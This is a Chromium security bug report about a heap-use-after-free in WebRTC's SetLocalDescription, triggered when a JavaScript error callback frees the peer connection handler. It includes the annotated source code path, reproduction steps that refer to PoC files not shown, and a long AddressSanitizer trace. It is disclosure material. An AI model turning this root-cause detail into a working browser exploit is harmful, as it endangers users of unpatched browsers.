# Security: heap-use-after-free in RTCPeerConnectionHandler::SetLocalDescription

| Field | Value |
|-------|-------|
| **Issue ID** | [40050154](https://issues.chromium.org/issues/40050154) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ba...@gmail.com |
| **Assignee** | hb...@chromium.org |
| **Created** | 2019-09-18 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

- RTCPeerConnection class has 'std::unique\_ptr<WebRTCPeerConnectionHandler> peer\_handler\_'. (<https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.h?l=539&gsn=peer_handler>\_)  
  
  class MODULES\_EXPORT RTCPeerConnection final  
  
  : public EventTargetWithInlineData,  
  
  public WebRTCPeerConnectionHandlerClient,  
  
  public ActiveScriptWrappable<RTCPeerConnection>,  
  
  public ContextLifecycleObserver,  
  
  public MediaStreamObserver {  
  
  DEFINE\_WRAPPERTYPEINFO();  
  
  USING\_GARBAGE\_COLLECTED\_MIXIN(RTCPeerConnection);  
  
  USING\_PRE\_FINALIZER(RTCPeerConnection, Dispose);  
  
  // ...  
  
  std::unique\_ptr<WebRTCPeerConnectionHandler> peer\_handler\_;  
  
  // ...  
  
  }
- Calling RTCPeerConnection.setLocalDescription js-method with three arguments calls RTCPeerConnection::setLocalDescription with user-supplied success/error callback js functions. (<https://cs.chromium.org/chromium/src/out/Debug/gen/third_party/blink/renderer/bindings/modules/v8/v8_rtc_peer_connection.cc?type=cs&g=0&l=945>)  
  
  static void SetLocalDescription2Method(const v8::FunctionCallbackInfo[v8::Value](javascript:void(0);)& info) {  
  
  // ...  
  
  success\_callback = V8VoidFunction::Create(info[1].As[v8::Function](javascript:void(0);)());  
  
  // ...  
  
  failure\_callback = V8RTCPeerConnectionErrorCallback::Create(info[2].As[v8::Function](javascript:void(0);)());  
  
  // ...  
  
  ScriptPromise result = impl->setLocalDescription(script\_state, description, success\_callback, failure\_callback);  
  
  // ...  
  
  }
- Later it calls RTCPeerConnectionHandler::SetLocalDescription function via 'peer\_handler\_->SetLocalDescription'. RTCPeerConnectionHandler class is child class of WebRTCPeerConnectionHandler class. (<https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc?type=cs&g=0&l=1311>)  
  
  ScriptPromise RTCPeerConnection::setLocalDescription(  
  
  ScriptState\* script\_state,  
  
  const RTCSessionDescriptionInit\* session\_description\_init,  
  
  V8VoidFunction\* success\_callback,  
  
  V8RTCPeerConnectionErrorCallback\* error\_callback) {  
  
  // ...  
  
  auto\* request = MakeGarbageCollected<RTCVoidRequestImpl>(  
  
  GetExecutionContext(),  
  
  GetRTCVoidRequestOperationType(SetSdpOperationType::kSetLocalDescription,  
  
  \*session\_description\_init),  
  
  this, success\_callback, error\_callback);  
  
  peer\_handler\_->SetLocalDescription(  
  
  request, WebRTCSessionDescription(session\_description\_init->type(),  
  
  session\_description\_init->sdp()));  
  
  // ...  
  
  }
- In RTCPeerConnectionHandler::SetLocalDescription function, user-supplied error callback js function will be called when error occured(failed to parse SessionDescription). (<https://cs.chromium.org/chromium/src/content/renderer/media/webrtc/rtc_peer_connection_handler.cc?g=0&l=1236>)  
  
  void RTCPeerConnectionHandler::SetLocalDescription(  
  
  const blink::WebRTCVoidRequest& request,  
  
  const blink::WebRTCSessionDescription& description) {  
  
  DCHECK(task\_runner\_->RunsTasksInCurrentSequence());  
  
  TRACE\_EVENT0("webrtc", "RTCPeerConnectionHandler::setLocalDescription");
  
  std::string sdp = description.Sdp().Utf8();  
  
  std::string type = description.GetType().Utf8();
  
  if (peer\_connection\_tracker\_) {  
  
  peer\_connection\_tracker\_->TrackSetSessionDescription(  
  
  this, sdp, type, PeerConnectionTracker::SOURCE\_LOCAL);  
  
  }
  
  webrtc::SdpParseError error;  
  
  // Since CreateNativeSessionDescription uses the dependency factory, we need  
  
  // to make this call on the current thread to be safe.  
  
  webrtc::SessionDescriptionInterface\* native\_desc =  
  
  CreateNativeSessionDescription(sdp, type, &error);  
  
  if (!native\_desc) {  
  
  std::string reason\_str = "Failed to parse SessionDescription. ";  
  
  reason\_str.append(error.line);  
  
  reason\_str.append(" ");  
  
  reason\_str.append(error.description);  
  
  LOG(ERROR) << reason\_str;  
  
  request.RequestFailed(webrtc::RTCError(webrtc::RTCErrorType::INTERNAL\_ERROR,  
  
  std::move(reason\_str))); // (Point 1) Call user-supplied callback function  
  
  if (peer\_connection\_tracker\_) { // (Point 2) Use of member variable: peer\_connection\_tracker\_  
  
  peer\_connection\_tracker\_->TrackSessionDescriptionCallback( // // (Point 3) Use of member variable: peer\_connection\_tracker\_  
  
  this, PeerConnectionTracker::ACTION\_SET\_LOCAL\_DESCRIPTION,  
  
  "OnFailure", reason\_str);  
  
  }  
  
  return;  
  
  }  
  
  // ...  
  
  }
- But the error callback javascript could invalidate(free) the RTCPeerConnectionHandler object. <= (Point 1)
- Later freed object will be used(this object). UAF will be triggered. <= (Point 2) and (Point 3)

**VERSION**  

Chrome Version: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.0 Safari/537.36  

Operating System: All

**REPRODUCTION CASE**

1. Load HTTP server and host both 'poc.html' and 'poc\_in.html' files (e.g. python -m SimpleHTTPServer)
2. Access the hosted 'poc.html' file (e.g. <http://ip:port/poc.html>)
3. Crash occured

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: Browser  

Crash State: Address Sanitizer output

=================================================================  

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x6160000aff00 at pc 0x5642ecb17181 bp 0x7ffefcf35f20 sp 0x7ffefcf35f18  

READ of size 8 at 0x6160000aff00 thread T0 (chrome)  

==1==WARNING: invalid path to external symbolizer!  

==1==WARNING: Failed to use and restart external symbolizer!  

#0 0x5642ecb17180 in operator bool ./../../base/memory/scoped\_refptr.h:238:43  

#1 0x5642ecb17180 in base::internal::WeakReference::IsValid() const ./../../base/memory/weak\_ptr.cc:54:0  

#2 0x5642fbb4a8db in get ./../../base/memory/weak\_ptr.h:247:17  

#3 0x5642fbb4a8db in operator bool ./../../base/memory/weak\_ptr.h:260:0  

#4 0x5642fbb4a8db in content::RTCPeerConnectionHandler::SetLocalDescription(blink::WebRTCVoidRequest const&, blink::WebRTCSessionDescription const&) ./../../content/renderer/media/webrtc/rtc\_peer\_connection\_handler.cc:1240:0  

#5 0x5642fcca7d76 in blink::RTCPeerConnection::setLocalDescription(blink::ScriptState\*, blink::RTCSessionDescriptionInit const\*, blink::V8VoidFunction\*, blink::V8RTCPeerConnectionErrorCallback\*) ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_peer\_connection.cc:1311:18  

#6 0x5642fcd6787f in blink::rtc\_peer\_connection\_v8\_internal::SetLocalDescription2Method(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:944:32  

#7 0x5642fcd593ca in SetLocalDescriptionMethod ./../../v8/include/v8-internal.h:0:12  

#8 0x5642fcd593ca in blink::V8RTCPeerConnection::SetLocalDescriptionMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:1792:0  

#9 0x5642e8cd6548 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:158:3  

#10 0x5642e8cd4237 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:111:36  

#11 0x5642e8cd2124 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:141:5  

#12 0x5642eaa27138 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#13 0x5642ea9a6763 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#14 0x5642ea9a3d5c in Builtins\_JSEntryTrampoline ??:0:0  

#15 0x5642ea9a3b37 in Builtins\_JSEntry ??:0:0  

#16 0x5642e8f45709 in Call ./../../v8/src/execution/simulator.h:138:12  

#17 0x5642e8f45709 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:266:0  

#18 0x5642e8f44af5 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:358:10  

#19 0x5642e8b8cbf7 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) ./../../v8/src/api/api.cc:2139:7  

#20 0x5642f630707e in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:341:22  

#21 0x5642f7b860e5 in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:134:20  

#22 0x5642f7b889be in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&, blink::ScriptController::ExecuteScriptPolicy) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:353:33  

#23 0x5642f7b893c2 in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:318:3  

#24 0x5642f9e0648d in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script\*, blink::ScriptElementBase\*, bool, bool, bool, base::TimeTicks, bool) ./../../third\_party/blink/renderer/core/script/pending\_script.cc:275:13  

#25 0x5642f9e05d6a in blink::PendingScript::ExecuteScriptBlock(blink::KURL const&) ./../../third\_party/blink/renderer/core/script/pending\_script.cc:183:3  

#26 0x5642f9e0b288 in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:873:9  

#27 0x5642f9dadb7e in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:597:20  

#28 0x5642f9dad6fb in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:333:3  

#29 0x5642f8ad3e91 in RunScriptsForPausedTreeBuilder ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:301:21  

#30 0x5642f8ad3e91 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:554:0  

#31 0x5642f8acf919 in blink::HTMLDocumentParser::PumpPendingSpeculations() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:612:9  

#32 0x5642eacaead7 in Run ./../../base/callback.h:98:12  

#33 0x5642eacaead7 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) ./../../third\_party/blink/renderer/platform/scheduler/common/post\_cancellable\_task.cc:47:0  

#34 0x5642ecbd4482 in Run ./../../base/callback.h:98:12  

#35 0x5642ecbd4482 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/task/common/task\_annotator.cc:142:0  

#36 0x5642ecc0d706 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:365:23  

#37 0x5642ecc0cc97 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:219:7  

#38 0x5642ecb18ee0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:39:55  

#39 0x5642ecc0f75e in Run ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:463:12  

#40 0x5642ecc0f75e in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:0:0  

#41 0x5642ecb8641c in base::RunLoop::RunWithTimeout(base::TimeDelta) ./../../base/run\_loop.cc:157:14  

#42 0x5642fd13a77b in content::RendererMain(content::MainFunctionParams const&) ./../../content/renderer/renderer\_main.cc:210:16  

#43 0x5642ebbb09f0 in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:518:14  

#44 0x5642ebbb409b in content::ContentMainRunnerImpl::Run(bool) ./../../content/app/content\_main\_runner\_impl.cc:871:10  

#45 0x5642ebd51b1b in service\_manager::Main(service\_manager::MainParams const&) ./../../services/service\_manager/embedder/main.cc:422:29  

#46 0x5642ebbaef44 in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content\_main.cc:19:10  

#47 0x5642e30e2ddd in ChromeMain ./../../chrome/app/chrome\_main.cc:110:12  

#48 0x7f8303d7c82f in \_\_libc\_start\_main /build/glibc-LK5gWL/glibc-2.23/csu/../csu/libc-start.c:291:0

0x6160000aff00 is located 128 bytes inside of 584-byte region [0x6160000afe80,0x6160000b00c8)  

freed by thread T0 (chrome) here:  

#0 0x5642e30e0bbd in operator delete(void\*) *asan\_rtl*:3  

#1 0x5642fcccafcf in operator() ./../../buildtools/third\_party/libc++/trunk/include/memory:2338:5  

#2 0x5642fcccafcf in reset ./../../buildtools/third\_party/libc++/trunk/include/memory:2651:0  

#3 0x5642fcccafcf in blink::RTCPeerConnection::ReleasePeerConnectionHandler() ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_peer\_connection.cc:3021:0  

#4 0x5642f8119082 in Call ./../../third\_party/blink/renderer/platform/lifecycle\_notifier.h:140:15  

#5 0x5642f8119082 in blink::LifecycleNotifier<blink::ExecutionContext, blink::ContextLifecycleObserver>::NotifyContextDestroyed() ./../../third\_party/blink/renderer/platform/lifecycle\_notifier.h:161:0  

#6 0x5642f7aefe8a in blink::Document::Shutdown() ./../../third\_party/blink/renderer/core/dom/document.cc:3310:21  

#7 0x5642f840425e in blink::LocalFrame::DetachImpl(blink::FrameDetachType) ./../../third\_party/blink/renderer/core/frame/local\_frame.cc:318:18  

#8 0x5642f83bdb35 in blink::Frame::Detach(blink::FrameDetachType) ./../../third\_party/blink/renderer/core/frame/frame.cc:82:3  

#9 0x5642f7ab8e30 in blink::ChildFrameDisconnector::DisconnectCollectedFrameOwners() ./../../third\_party/blink/renderer/core/dom/child\_frame\_disconnector.cc:59:14  

#10 0x5642f7ab83d1 in blink::ChildFrameDisconnector::Disconnect(blink::ChildFrameDisconnector::DisconnectPolicy) ./../../third\_party/blink/renderer/core/dom/child\_frame\_disconnector.cc:32:3  

#11 0x5642f7a8f831 in blink::ContainerNode::WillRemoveChild(blink::Node&) ./../../third\_party/blink/renderer/core/dom/container\_node.cc:622:33  

#12 0x5642f7a8e986 in blink::ContainerNode::RemoveChild(blink::Node\*, blink::ExceptionState&) ./../../third\_party/blink/renderer/core/dom/container\_node.cc:694:3  

#13 0x5642f63c381c in remove ./../../third\_party/blink/renderer/core/dom/child\_node.h:36:17  

#14 0x5642f63c381c in RemoveMethod ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_element.cc:3375:0  

#15 0x5642f63c381c in blink::V8Element::RemoveMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_element.cc:4997:0  

#16 0x5642e8cd6548 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:158:3  

#17 0x5642e8cd4237 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:111:36  

#18 0x5642e8cd2124 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:141:5  

#19 0x5642eaa27138 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#20 0x5642ea9a6763 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#21 0x5642ea99fdfb in Builtins\_ArgumentsAdaptorTrampoline ??:0:0  

#22 0x5642ea9a3d5c in Builtins\_JSEntryTrampoline ??:0:0  

#23 0x5642ea9a3b37 in Builtins\_JSEntry ??:0:0  

#24 0x5642e8f45709 in Call ./../../v8/src/execution/simulator.h:138:12  

#25 0x5642e8f45709 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:266:0  

#26 0x5642e8f44af5 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:358:10  

#27 0x5642e8bcc6c4 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) ./../../v8/src/api/api.cc:4812:7  

#28 0x5642f6309e50 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:472:17  

#29 0x5642fcd7d130 in blink::V8RTCPeerConnectionErrorCallback::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::DOMException\*) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection\_error\_callback.cc:99:8  

#30 0x5642fcd7d787 in blink::V8RTCPeerConnectionErrorCallback::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::DOMException\*) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection\_error\_callback.cc:121:7  

#31 0x5642fcd7df67 in blink::RTCVoidRequestImpl::RequestFailed(webrtc::RTCError const&) ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_void\_request\_impl.cc:73:22  

#32 0x5642fbb4a894 in content::RTCPeerConnectionHandler::SetLocalDescription(blink::WebRTCVoidRequest const&, blink::WebRTCSessionDescription const&) ./../../content/renderer/media/webrtc/rtc\_peer\_connection\_handler.cc:1238:13  

#33 0x5642fcca7d76 in blink::RTCPeerConnection::setLocalDescription(blink::ScriptState\*, blink::RTCSessionDescriptionInit const\*, blink::V8VoidFunction\*, blink::V8RTCPeerConnectionErrorCallback\*) ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_peer\_connection.cc:1311:18  

#34 0x5642fcd6787f in blink::rtc\_peer\_connection\_v8\_internal::SetLocalDescription2Method(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:944:32  

#35 0x5642fcd593ca in SetLocalDescriptionMethod ./../../v8/include/v8-internal.h:0:12  

#36 0x5642fcd593ca in blink::V8RTCPeerConnection::SetLocalDescriptionMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:1792:0

previously allocated by thread T0 (chrome) here:  

#0 0x5642e30e035d in operator new(unsigned long) *asan\_rtl*:3  

#1 0x5642fb40e46e in make\_unique<content::RTCPeerConnectionHandler, blink::WebRTCPeerConnectionHandlerClient \*&, content::PeerConnectionDependencyFactory \*, scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);) &> ./../../buildtools/third\_party/libc++/trunk/include/memory:3131:28  

#2 0x5642fb40e46e in content::PeerConnectionDependencyFactory::CreateRTCPeerConnectionHandler(blink::WebRTCPeerConnectionHandlerClient\*, scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);)) ./../../content/renderer/media/webrtc/peer\_connection\_dependency\_factory.cc:149:0  

#3 0x5642fd126e47 in content::RendererBlinkPlatformImpl::CreateRTCPeerConnectionHandler(blink::WebRTCPeerConnectionHandlerClient\*, scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);)) ./../../content/renderer/renderer\_blink\_platform\_impl.cc:568:34  

#4 0x5642fcc9a643 in blink::RTCPeerConnection::RTCPeerConnection(blink::ExecutionContext\*, webrtc::PeerConnectionInterface::RTCConfiguration, bool, blink::WebMediaConstraints, blink::ExceptionState&) ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_peer\_connection.cc:741:40  

#5 0x5642fcc94695 in MakeGarbageCollected<blink::RTCPeerConnection, blink::ExecutionContext \*&, webrtc::PeerConnectionInterface::RTCConfiguration, bool, blink::WebMediaConstraints &, blink::ExceptionState &> ./../../third\_party/blink/renderer/platform/heap/heap.h:522:30  

#6 0x5642fcc94695 in blink::RTCPeerConnection::Create(blink::ExecutionContext\*, blink::RTCConfiguration const\*, blink::Dictionary const&, blink::ExceptionState&) ./../../third\_party/blink/renderer/modules/peerconnection/rtc\_peer\_connection.cc:680:0  

#7 0x5642fcd50cde in Constructor ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:1493:29  

#8 0x5642fcd50cde in blink::rtc\_peer\_connection\_v8\_internal::ConstructorCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_rtc\_peer\_connection.cc:1517:0  

#9 0x5642e8cd6548 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:158:3  

#10 0x5642e8cd3613 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:111:36  

#11 0x5642e8cd20d4 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:137:5  

#12 0x5642eaa27138 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#13 0x5642ea9a20f9 in Builtins\_JSBuiltinsConstructStub ??:0:0  

#14 0x5642eaa8779f in Builtins\_ConstructHandler ??:0:0  

#15 0x5642ea9a6763 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#16 0x5642ea9a3d5c in Builtins\_JSEntryTrampoline ??:0:0  

#17 0x5642ea9a3b37 in Builtins\_JSEntry ??:0:0  

#18 0x5642e8f45709 in Call ./../../v8/src/execution/simulator.h:138:12  

#19 0x5642e8f45709 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:266:0  

#20 0x5642e8f44af5 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:358:10  

#21 0x5642e8b8cbf7 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) ./../../v8/src/api/api.cc:2139:7  

#22 0x5642f630707e in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:341:22  

#23 0x5642f7b860e5 in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:134:20  

#24 0x5642f7b889be in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&, blink::ScriptController::ExecuteScriptPolicy) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:353:33  

#25 0x5642f7b893c2 in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:318:3  

#26 0x5642f9e0648d in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script\*, blink::ScriptElementBase\*, bool, bool, bool, base::TimeTicks, bool) ./../../third\_party/blink/renderer/core/script/pending\_script.cc:275:13  

#27 0x5642f9e05d6a in blink::PendingScript::ExecuteScriptBlock(blink::KURL const&) ./../../third\_party/blink/renderer/core/script/pending\_script.cc:183:3  

#28 0x5642f9e0b288 in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:873:9  

#29 0x5642f9dadb7e in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:597:20  

#30 0x5642f9dad6fb in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:333:3  

#31 0x5642f8ad3e91 in RunScriptsForPausedTreeBuilder ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:301:21  

#32 0x5642f8ad3e91 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:554:0  

#33 0x5642f8acf919 in blink::HTMLDocumentParser::PumpPendingSpeculations() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:612:9  

#34 0x5642eacaead7 in Run ./../../base/callback.h:98:12  

#35 0x5642eacaead7 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) ./../../third\_party/blink/renderer/platform/scheduler/common/post\_cancellable\_task.cc:47:0

SUMMARY: AddressSanitizer: heap-use-after-free (/home/banananapenguin/asan-linux-release-681094/chrome+0x126c9180)  

Shadow bytes around the buggy address:  

0x0c2c8000df90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2c8000dfa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2c8000dfb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2c8000dfc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2c8000dfd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c2c8000dfe0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2c8000dff0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2c8000e000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2c8000e010: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c2c8000e020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2c8000e030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

